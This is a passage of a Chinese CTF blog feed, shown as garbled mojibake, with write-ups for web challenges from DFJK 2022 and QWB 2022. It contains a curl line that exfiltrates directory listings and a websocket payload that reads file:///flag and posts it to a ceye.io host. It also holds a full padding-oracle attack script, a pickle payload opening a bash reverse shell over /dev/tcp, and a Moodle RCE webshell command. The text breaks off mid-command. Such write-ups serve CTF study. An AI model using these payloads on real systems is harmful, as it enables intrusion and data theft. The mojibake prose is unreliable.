ï¼Œæœäº†ä¸‹è¿™ä¸ªæ´ï¼Œè§¦å‘ç‚¹åœ¨doAså‚æ•°ï¼Œè¿™ä¸ªå‚æ•°ç›´æ¥åˆå¹¶åˆ°<code>/bin/bash -c &quot;id -Gn å‚æ•°&quot;</code>ä¸­ï¼Œå‘½ä»¤æ‹¼æ¥ä¸€ä¸‹å°±è¡Œï¼Œäºæ˜¯åœ¨vpsä¸Šç›‘å¬ï¼Œç”¨;åšä¸€ä¸‹åˆ†å‰²å°±å¯ä»¥ï¼ˆæ³¨æ„payloadéœ€è¦ä¸¤æ¬¡urlç¼–ç ï¼Œä¸€æ¬¡æ˜¯ssrfäºŒæ¬¡æ˜¯å†…ç½‘webæœåŠ¡ï¼‰,payloadå¦‚ä¸‹</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20220822191901305.png" alt="image-20220822191901305"></p><p>è¿™é‡Œç¯å¢ƒæ¯”è¾ƒå‘ï¼Œæˆ‘åœ¨ç¾ä¸½å›½çš„vpsæ”¶ä¸åˆ°ï¼Œä½†æ˜¯å›½å†…çš„vpsç‚¹å‡»å°±ä¸Šï¼Œå½“æ—¶æŠ˜è…¾äº†å¥½ä¹…ï¼Œè®°å½•ä¸‹curlå¤–å¸¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;curl -d &quot;x=$(ls /|base64)&quot; http://8.8.8.8</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NS - DFJK 2022</title>
      <link href="/2022/08/17/DFJK2022/"/>
      <url>/2022/08/17/DFJK2022/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ä½“éªŒä¸€èˆ¬å§ï¼Œå¾ˆå¯æƒœæœ‰é“é¢˜æœ€åä¸€ç‚¹æ²¡å‡º</p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezWeb"><a href="#ezWeb" class="headerlink" title="ezWeb"></a>ezWeb</h2><ol><li>ä¸‹è½½æºç ï¼Œå‘ç°ç»™äº†ä¸€å®šçš„æç¤ºï¼Œæ¯”å¦‚flagåœ¨å“ªé‡Œï¼Œä»¥åŠèƒ½å¤Ÿè¯»å–çš„æƒé™ï¼Œè¿˜æœ‰adminæƒé™</li><li>å®¡è®¡æºç ä»¥åŠdiffå…¶ä¸githubä»“åº“ä»£ç çš„ä¸åŒï¼Œé‡ç‚¹æ‰¾mysqlç”¨æˆ·æƒé™é¡µé¢ï¼Œç„¶åæ‰¾åˆ°äº†ä¿©ç”¨æˆ·åˆ†åˆ«çš„æ³¨å…¥ç‚¹ï¼Œä½äºgrave/graveyard.phpå’Œtags/tags.php</li><li>payloadå¦‚ä¸‹ï¼Œåˆ©ç”¨æŠ¥é”™æ³¨å…¥å‡ºç»“æœï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯tagsé¡µé¢çš„æ³¨å…¥éœ€è¦çŸ¥é“mysql_real_escape_stringåœ¨sql_modeæŒ‡å®šä¸ºNO_BACKSLASH_ESCAPESçš„æƒ…å†µä¸‹åªç®¡å•å¼•å·ï¼Œæ¢å¥è¯è¯´ä¸æ‹¦åŒå¼•å·</li></ol><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220818190244460.(null)" alt="img"></p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220818185934749.(null)" alt="img"></p><h2 id="ezWebpro-æœªè§£å‡º"><a href="#ezWebpro-æœªè§£å‡º" class="headerlink" title="ezWebpro(æœªè§£å‡º)"></a>ezWebpro(æœªè§£å‡º)</h2><p>è¿™é¢˜å¯æƒœäº†æ—¶é—´ä¸å¤Ÿäº†ï¼Œæœ€ååŠå°æ—¶æ‰çœ‹åˆ°é¢˜ç›®æè¿°ï¼Œè™½ç„¶æ²¡å‡ºä¹Ÿç®€å•è¯´ä¸€ä¸‹å§</p><p>åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šæ²¡æœ‰adminç”¨æˆ·äº†ï¼Œä¹Ÿå°±æ˜¯è¯´æ³¨å…¥ç‚¹éš¾ä»¥åˆ©ç”¨ï¼Œä½†æ˜¯ç»™äº†botï¼Œè¿™ä¸ªæ—¶å€™ä¸éš¾æƒ³åˆ°è¦æ‰¾xssæ‰“ï¼Œé˜…è¯»å®Œæºç ï¼ŒåŸºæœ¬éƒ½è½¬ä¹‰äº†htmlä»£ç ï¼Œä¸å¥½åŠ¨æ‰‹ã€‚çªç„¶æƒ³åˆ°äº†ä¸Šä¸€é¢˜çš„æŠ¥é”™ï¼Œåœ¨æŠ¥é”™é¡µé¢ä¸å°±å¯ä»¥ç›´æ¥æ‰“xssäº†ä¹ˆã€‚é‚£ä¹ˆæ•´ä½“æ€è·¯å°±å˜æˆäº†é€šè¿‡csrf-&gt;sqlæ‰“æ•°æ®-&gt;sqlæ‰“xsså¸¦å‡ºæ•°æ®ã€‚ç„¶åç”±äºæ²¡è¯»é¢˜ï¼Œå¯¼è‡´è¿™é‡Œåœ¨æ‰¾flagå¡äº†å¾ˆä¹…ã€‚åé¢é˜…è¯»äº†é¢˜ä»hinté‡Œè¯»åˆ°äº†ç±»ä¼¼cdpçš„jsonï¼Œé‡Œé¢ç»™å‡ºäº†webSocketDebuggerUrlåœ°å€ï¼Œä¸éš¾æƒ³è±¡åç»­å°±æ˜¯ä»sqlæ‰“æ•°æ®å˜æˆæ‰“wsã€‚</p><p>åˆ°è¿™é‡Œæ—¶é—´ä¹Ÿç»“æŸäº†ï¼Œåªæœ‰æ¯”èµ›ç»“æŸåæœ¬åœ°æµ‹è¯•äº†ï¼Œè¿™é‡Œå‡è®¾flagåœ¨/flagã€‚æœ¬åœ°chromeèµ·äº†ä¸ªè¿œç¨‹è°ƒè¯•ç«¯å£ï¼Œç„¶ååˆ©ç”¨wsæ“ä½œï¼Œé¦–å…ˆåˆ©ç”¨<code>Page.navigate</code>æ§åˆ¶æµè§ˆå™¨è®¿é—®file:///flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ws.send(JSON.stringify(&#123;id:0, method:&#x27;Page.navigate&#x27;, params:&#123;url: &#x27;file:///flag&#x27;&#125;&#125;))</span><br></pre></td></tr></table></figure><p>å†åˆ©ç”¨<code>Runtime.evaluate</code>æ‰§è¡ŒjsæŠŠflagå¸¦å‡ºæ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ws.send(JSON.stringify(&#123;id:0, method: &#x27;Runtime.evaluate&#x27;, params:&#123;expression:&#x27;var xhr = new XMLHttpRequest();xhr.open(&quot;post&quot;,&quot;``http://xxx.ceye.io/``&quot;);xhr.send(&quot;res=&quot;+document.body.textContent);&#x27;&#125;&#125;))</span><br></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿæ²¡æœºä¼šå®é™…æµ‹è¯•äº†ï¼Œç­‰å¾…åç»­wpå­¦ä¹ ^^</p><h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><p>è¿™é¢˜é‡ç‚¹è®°å½•ä¸€ä¸‹æ²¡ç»™æç¤ºä¹‹å‰çš„é€»è¾‘æ¨ç†ã€‚é¦–å…ˆæ˜¯cookieé‡Œæœ‰ä¸¤ä¸ªå­—æ®µåˆ†åˆ«æ˜¯admin_passwordå’Œä¸€ä¸ªåŒ…å«äº†admin_passwordçš„jwtï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯jwtä¼ªé€ æˆ–è€…çˆ†ç ´secretçš„æ“ä½œã€‚åæ¥æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°ï¼Œadmin_passwordçš„base64å­—ç¬¦ä¸²åˆ æ‰ä¸€ä¸ª=ä¼šå‘Šè­¦padding errorï¼Œè€Œå¢åŠ ä¸€ä¸ªå¹¶ä¸ä¼šï¼Œäºæ˜¯å°±åœ¨æƒ³è¿™é‡Œåº”è¯¥æ˜¯åˆä¸ªä¸¥æ ¼çš„å¯†ç è§£å¯†çš„è¿‡ç¨‹ï¼Œè¿™é‡Œä¹Ÿè®¸æ€è·¯å°±åº”è¯¥æ˜¯è€ƒè™‘é’ˆå¯¹admin_passwordè¿›è¡Œpadding oracleçˆ†ç ´äº†ã€‚åˆ°è¿™é‡Œæˆ‘å°±æ²¡åšäº†ï¼Œç»™r1ngså¸ˆå‚…æå»äº†ï¼Œè´´ä¸ªè„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from base64 import *</span><br><span class="line">session = requests.session()</span><br><span class="line">from Crypto.Util.strxor import strxor</span><br><span class="line"></span><br><span class="line">data = &#123;&#x27;username&#x27;: &#x27;admin&#x27;,</span><br><span class="line">        &#x27;password&#x27;: &#x27;90&#x27;&#125;</span><br><span class="line">url = &#x27;http://xxxx&#x27;</span><br><span class="line">admin_password = &#x27;sQYbmlM3493UzUR9uL0tHmK3fabMHC8zH90ZxDGzVsiO3df4TOpTXKKZDv9usNKx2BJECyBZiMU6Rs+BIjF9uQ==&#x27;</span><br><span class="line"></span><br><span class="line">cipher = b64decode(admin_password)</span><br><span class="line">iv = cipher[:16]</span><br><span class="line">first = cipher[16:32]</span><br><span class="line">second = cipher[32:48]</span><br><span class="line">last = cipher[48:64]</span><br><span class="line">&#x27;&#x27;&#x27;æœ€åä¸€ä½paddingå°±æ˜¯01æˆ–è€…12ï¼Œç»è¿‡éªŒè¯ä¸º12&#x27;&#x27;&#x27;</span><br><span class="line"># for i in range(0, 17):</span><br><span class="line">#     tmp = second[:15] + strxor(strxor(bytes([second[15]]), chr(i).encode()), chr(1).encode())</span><br><span class="line">#     cookies = &#123;&#x27;admin_password&#x27;: b64encode(iv + first + tmp + last).decode(),</span><br><span class="line">#                &#x27;session&#x27;: &#x27;eyJhZG1pbl9wYXNzd29yZCI6IjYzLzZIemZyV2NqUTNsUXBvL0JLd1NBdElZMUdYajBtc3JoS3p3bzBkMXpJN3UyWHRibytsRWtpLzRjUk0xUmdkeHFZWHZDL0VoTFZRVEZiRlVGMnVBPT0iLCJpc2FkbWluIjpmYWxzZX0.YvyQwA.A_cj48Q1jRm6GEnPuxKbi1Ljd9k&#x27;&#125;</span><br><span class="line">#     response = session.post(url, data=data, cookies=cookies)</span><br><span class="line">#     print(response.text)</span><br><span class="line">#     print(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># flag = &#x27;&#x27;</span><br><span class="line"># for i in range(15, -1, -1):</span><br><span class="line">&#x27;&#x27;&#x27;é¿å…01çš„å¹²æ‰°ï¼Œèµ·å§‹ä½è°ƒåˆ°10&#x27;&#x27;&#x27;</span><br><span class="line">#     for j in range(10, 128):</span><br><span class="line">#         tmp = second[:i] + strxor(strxor(second[i:], chr(j).encode() + flag.encode()), (16-i) * chr(16-i).encode())</span><br><span class="line">#         cookies = &#123;&#x27;admin_password&#x27;: b64encode(iv + first + tmp + last).decode(),</span><br><span class="line">#                    &#x27;session&#x27;: &#x27;eyJhZG1pbl9wYXNzd29yZCI6InNRWWJtbE0zNDkzVXpVUjl1TDB0SG1LM2ZhYk1IQzh6SDkwWnhER3pWc2lPM2RmNFRPcFRYS0taRHY5dXNOS3gyQkpFQ3lCWmlNVTZScytCSWpGOXVRPT0iLCJpc2FkbWluIjpmYWxzZX0.Yvy0SQ.HkXV3V9wa8SFxAwSxOcXTdRFzSg&#x27;&#125;</span><br><span class="line">#         response = session.post(url, data=data, cookies=cookies)</span><br><span class="line">#         if &#x27;padding error&#x27; not in response.text:</span><br><span class="line">#             flag = chr(j) + flag</span><br><span class="line">#             print(flag)</span><br><span class="line">#             break</span><br><span class="line">&#x27;&#x27;&#x27;1155&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"># flag = &#x27;&#x27;</span><br><span class="line"># for i in range(15, -1, -1):</span><br><span class="line">#     for j in range(45, 128):</span><br><span class="line">#         tmp = first[:i] + strxor(strxor(first[i:], chr(j).encode() + flag.encode()), (16-i) * chr(16-i).encode())</span><br><span class="line">#         cookies = &#123;&#x27;admin_password&#x27;: b64encode(iv + tmp + second).decode(),</span><br><span class="line">#                    &#x27;session&#x27;: &#x27;eyJhZG1pbl9wYXNzd29yZCI6IjYzLzZIemZyV2NqUTNsUXBvL0JLd1NBdElZMUdYajBtc3JoS3p3bzBkMXpJN3UyWHRibytsRWtpLzRjUk0xUmdkeHFZWHZDL0VoTFZRVEZiRlVGMnVBPT0iLCJpc2FkbWluIjpmYWxzZX0.YvyQwA.A_cj48Q1jRm6GEnPuxKbi1Ljd9k&#x27;&#125;</span><br><span class="line">#         response = session.post(url, data=data, cookies=cookies)</span><br><span class="line">#         if &#x27;padding error&#x27; not in response.text:</span><br><span class="line">#             flag = chr(j) + flag</span><br><span class="line">#             print(flag)</span><br><span class="line">#             break</span><br><span class="line">&#x27;&#x27;&#x27;2f-8ae1-ab4526c8&#x27;&#x27;&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(15, -1, -1):</span><br><span class="line">    for j in range(32, 128):</span><br><span class="line">        tmp = iv[:i] + strxor(strxor(iv[i:], chr(j).encode() + flag.encode()), (16-i) * chr(16-i).encode())</span><br><span class="line">        cookies = &#123;&#x27;admin_password&#x27;: b64encode(tmp + first).decode(),</span><br><span class="line">                   &#x27;session&#x27;: &#x27;eyJhZG1pbl9wYXNzd29yZCI6IjYzLzZIemZyV2NqUTNsUXBvL0JLd1NBdElZMUdYajBtc3JoS3p3bzBkMXpJN3UyWHRibytsRWtpLzRjUk0xUmdkeHFZWHZDL0VoTFZRVEZiRlVGMnVBPT0iLCJpc2FkbWluIjpmYWxzZX0.YvyQwA.A_cj48Q1jRm6GEnPuxKbi1Ljd9k&#x27;&#125;</span><br><span class="line">        response = session.post(url, data=data, cookies=cookies)</span><br><span class="line">        if &#x27;padding error&#x27; not in response.text:</span><br><span class="line">            flag = chr(j) + flag</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">&#x27;&#x27;&#x27;901cf774-a947-4d2f-8ae1-ab4526c81155&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>å¯†ç ç™»é™†è¿›å»å°±æ˜¯flag</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NS - QWB 2022</title>
      <link href="/2022/08/01/QWB2022/"/>
      <url>/2022/08/01/QWB2022/</url>
      
        <content type="html"><![CDATA[<blockquote><p>è®°å½•ç”Ÿæ´»</p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="keyword">function</span> <span class="title">ws_attack</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&quot;ws://127.0.0.1:8888/bot&quot;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    ws.onopen = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123; </span></span></span><br><span class="line"><span class="javascript"><span class="xml">        ws.send(<span class="string">&quot;changepw 123456&quot;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">ws_attack();</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>å­˜ä¸ºexp.htmlæ”¾åœ¨æœåŠ¡å™¨ä¸Šï¼Œè®©botè®¿é—®exp.htmlï¼Œä¿®æ”¹adminå¯†ç ä¸º123456</p><p>ç™»å½•åˆ°adminï¼ŒæŠ“ä¹°ä¸œè¥¿çš„åŒ…</p><p><a href="https://bishopfox.com/blog/json-interoperability-vulnerabilities">https://bishopfox.com/blog/json-interoperability-vulnerabilities</a></p><p>æ–°å¢ä¸€ä¸ªnumé”®ä¸ºè´Ÿæ•°ï¼Œè®©flaskè§£æç¬¬äºŒä¸ªé‡å¤çš„é”®ï¼Œjsonparserè§£æç¬¬ä¸€ä¸ªé”®</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220818190134625.(null)" alt="img"></p><p>å°†é’±æ”¹åˆ°æœ€å¤§å€¼ä¹‹åï¼Œéšä¾¿ä¹°ç‚¹ä¸œè¥¿</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202020183.(null)" alt="img"></p><h2 id="crash"><a href="#crash" class="headerlink" title="crash"></a>crash</h2><p>ç»™äº†æºç ï¼Œç•™æ„åˆ°pickleåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># import sqlite3</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response,request, session</span><br><span class="line"><span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__,static_url_path=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">app.secret_key=random.randbytes(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, username,password</span>):</span></span><br><span class="line">        self.username=username</span><br><span class="line">        self.token=<span class="built_in">hash</span>(password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_password</span>(<span class="params">username</span>):</span></span><br><span class="line">    <span class="keyword">if</span> username==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> admin.secret</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># conn=sqlite3.connect(&quot;user.db&quot;)</span></span><br><span class="line">        <span class="comment"># cursor=conn.cursor()</span></span><br><span class="line">        <span class="comment"># cursor.execute(f&quot;select password from usertable where username=&#x27;&#123;username&#125;&#x27;&quot;)</span></span><br><span class="line">        <span class="comment"># data=cursor.fetchall()[0]</span></span><br><span class="line">        <span class="comment"># if data:</span></span><br><span class="line">        <span class="comment">#     return data[0] </span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     return None</span></span><br><span class="line">        <span class="keyword">return</span> session.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/balancer&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    pickle_data=base64.b64decode(request.cookies.get(<span class="string">&quot;userdata&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> pickle_data <span class="keyword">or</span> <span class="string">b&quot;secret&quot;</span> <span class="keyword">in</span> pickle_data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You damm hacker!&quot;</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -rf *py*&quot;</span>)</span><br><span class="line">    userdata=pickle.loads(pickle_data)</span><br><span class="line">    <span class="keyword">if</span> userdata.token!=<span class="built_in">hash</span>(get_password(userdata.username)):</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;Login First&quot;</span></span><br><span class="line">    <span class="keyword">if</span> userdata.username==<span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome admin, here is your next challenge!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;You&#x27;re not admin!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    resp = make_response(<span class="string">&quot;success&quot;</span>) </span><br><span class="line">    session[<span class="string">&quot;password&quot;</span>]=request.values.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">&quot;userdata&quot;</span>, base64.b64encode(pickle.dumps(User(request.values.get(<span class="string">&quot;username&quot;</span>),request.values.get(<span class="string">&quot;password&quot;</span>)),<span class="number">2</span>)), max_age=<span class="number">3600</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;source.txt&#x27;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>æ„é€ pickleååºåˆ—åŒ–ä¸Šçº¿shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/exp&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def exp():</span><br><span class="line">    payload=b&#x27;(cos\nsystem\nX\x36\x00\x00\x00bash -c &quot;bash -i &gt;&amp; /dev/tcp/xx.xxx.xxx.xxx/8888 0&gt;&amp;1&quot;o.&#x27;</span><br><span class="line">    return base64.b64encode(payload)</span><br></pre></td></tr></table></figure><p>ä¸Šçº¿åä¸€åº¦æ€€ç–‘è‡ªå·±æ€è·¯æƒ³ææƒä½†æ˜¯æ²¡æœ‰èƒ½åˆ©ç”¨çš„æ–¹å¼ï¼Œç„¶åçªç„¶æƒ³èµ·æ¥ä¼¼ä¹æ˜¯ä¸Šçº¿åä¸€ç›´502ï¼Œçœ‹èµ·æ¥ä»–è‡ªå·±pythonæœåŠ¡å´©äº†ï¼Œ504æ˜¯åç«¯è¶…æ—¶ï¼Œ502æ˜¯åç«¯å´©æ‰äº†ï¼Œå†™ä¸ªflaskæ›¿æ¢æ‰æœ¬æ¥çš„åç«¯æœåŠ¡ï¼Œnginxæ˜¯ä¸€ç›´åœ¨çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, static_url_path=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    import time</span><br><span class="line">    time.sleep(300)</span><br><span class="line">    return &quot;&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ç¯å¢ƒæ²¡æœ‰curlã€wgetè¿™äº›å¥½ç”¨çš„å‘½ä»¤ï¼Œå°†ä»£ç base64ç¼–ç ä¸€ä¸‹åˆ©ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ZnJvbSBmbGFzayBpbXBvcnQgRmxhc2sKCgphcHAgPSBGbGFzayhfX25hbWVfXywgc3RhdGljX3VybF9wYXRoPScnKQoKQGFwcC5yb3V0ZSgnLycsIG1ldGhvZHM9WydHRVQnLCAnUE9TVCddKQpkZWYgaW5kZXgoKToKICAgIGltcG9ydCB0aW1lCiAgICB0aW1lLnNsZWVwKDMwMCkKICAgIHJldHVybiAiIgoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIGFwcC5ydW4oaG9zdD0nMC4wLjAuMCcsIHBvcnQ9NTAwMCk= |base64 -d &gt; app.py</span><br></pre></td></tr></table></figure><p>é¡ºåˆ©å¯åŠ¨åï¼Œç”¨burpè®¿é—®ä¸€ä¸‹ï¼Œå®‰å¿ƒç­‰å¾…å³å¯</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202119570.(null)" alt="img"></p><h2 id="easylogin"><a href="#easylogin" class="headerlink" title="easylogin"></a>easylogin</h2><ol><li>é¦–å…ˆå‘èµ·é‡ç½®admin(sqlæ³¨å…¥å¯çŸ¥ç”¨æˆ·å)å¯†ç è¯·æ±‚ï¼Œæ¥ç€åˆ©ç”¨wpçš„SQLæ³¨å…¥è·å–é‡ç½®å¯†ç é“¾æ¥çš„token</li></ol><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202145649.(null)" alt="img"></p><ol><li><p>æ‹¿ç€tokené‡ç½®å¯†ç ç™»é™†moodleåå°ï¼Œåˆ©ç”¨<a href="https://github.com/HoangKien1020/Moodle_RCE">https://github.com/HoangKien1020/Moodle_RCE</a> Getshell</p></li><li><p>/blocks/rce/lang/en/block_rce.php?cmd=find / -type f |xargs grep &quot;flag{&quot; &gt; 